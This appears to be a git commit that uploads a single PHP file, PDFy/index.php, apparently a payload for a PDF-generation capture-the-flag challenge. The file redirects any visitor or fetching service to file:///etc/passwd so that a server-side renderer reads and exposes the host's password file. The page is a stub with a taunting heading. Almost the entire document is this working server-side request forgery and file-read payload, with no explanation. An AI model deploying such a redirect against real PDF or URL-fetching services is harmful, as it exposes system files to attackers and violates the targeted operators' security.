0cd21dea3a6058801c0f1d942656735da2658cb9
September <salbibar@gmail.com>
2024-06-19 13:31:27 +0300

    Add files via upload

---
+++ PDFy/index.php
@@ -0,0 +1,13 @@
+<?php
+     header('location:file:///etc/passwd');
+?>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>website</title>
+  </head>
+        <h1>sinSeptember is Commen 4 ya </h1>
+  <body>
+  </body>
+</html>
